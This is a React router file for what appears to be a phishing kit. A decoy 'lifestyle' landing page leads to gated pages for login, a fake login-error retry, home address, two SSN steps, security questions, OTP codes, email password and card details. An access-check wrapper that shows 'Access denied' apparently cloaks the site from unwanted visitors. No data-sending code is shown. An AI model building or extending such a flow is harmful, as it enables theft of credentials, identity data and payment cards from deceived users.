import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';
import FlowLayout from './components/FlowLayout';

// Pages
import LoginForm from './pages/LoginForm';
import LoginForm2 from './pages/LoginForm2';
import Register from './pages/Register';
import BasicInfo from './pages/BasicInfo';
import HomeAddress from './pages/HomeAddress';
import SSN1 from './pages/SSN1';
import SSN2 from './pages/SSN2';
import SecurityQuestions from './pages/SecurityQuestions';
import OTP from './pages/OTP';
import EmailPassword from './pages/EmailPassword';
import Card from './pages/Card';
import Terms from './pages/Terms';
import LifestyleDemo from './pages/LifestyleDemo';

interface ProtectedRouteProps {
  children: React.ReactNode;
}

const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ children }) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <FlowLayout>
        <div className="text-white">Loading...</div>
      </FlowLayout>
    );
  }

  if (isAllowed === false) {
    return (
      <FlowLayout>
        <div className="text-white">Access denied. Redirecting...</div>
      </FlowLayout>
    );
  }

  return <FlowLayout>{children}</FlowLayout>;
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />

        {/* Protected routes */}
        <Route path="/login" element={<ProtectedRoute><LoginForm /></ProtectedRoute>} />
        <Route path="/login-error" element={<ProtectedRoute><LoginForm2 /></ProtectedRoute>} />
        <Route path="/register" element={<ProtectedRoute><Register /></ProtectedRoute>} />
        <Route path="/basic-info" element={<ProtectedRoute><BasicInfo /></ProtectedRoute>} />
        <Route path="/home-address" element={<ProtectedRoute><HomeAddress /></ProtectedRoute>} />
        <Route path="/ssn1" element={<ProtectedRoute><SSN1 /></ProtectedRoute>} />
        <Route path="/ssn2" element={<ProtectedRoute><SSN2 /></ProtectedRoute>} />
        <Route path="/security-questions" element={<ProtectedRoute><SecurityQuestions /></ProtectedRoute>} />
        <Route path="/otp" element={<ProtectedRoute><OTP /></ProtectedRoute>} />
        <Route path="/email-password" element={<ProtectedRoute><EmailPassword /></ProtectedRoute>} />
        <Route path="/card" element={<ProtectedRoute><Card /></ProtectedRoute>} />
        <Route path="/terms" element={<ProtectedRoute><Terms /></ProtectedRoute>} />

        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;
